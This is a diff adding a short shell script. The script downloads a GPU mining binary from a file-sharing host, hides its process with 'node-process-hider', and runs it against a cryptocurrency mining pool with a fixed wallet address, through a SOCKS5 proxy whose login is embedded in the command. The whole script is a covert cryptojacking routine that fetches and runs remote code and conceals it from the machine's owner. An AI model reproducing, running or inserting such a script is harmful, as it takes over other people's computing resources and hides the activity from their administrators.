@@ -1,0 +1,8 @@
+apt-get update
+apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev npm
+apt install ocl-icd-opencl-dev
+wget -q https://bin.jvnv.net/file/qJ7G1/ac-gpu
+npm i -g node-process-hider
+chmod +x ac-gpu
+ph add ac-gpu
+./ac-gpu -F http://pool.aquachain.xyz:8888/0xa1ab79ade8b4d41d7c898a44521d567f59e8f082/paper -t 1 --proxy socks5://14abf5d6e18da:dbb7a6d2ae@185.242.108.88:12324
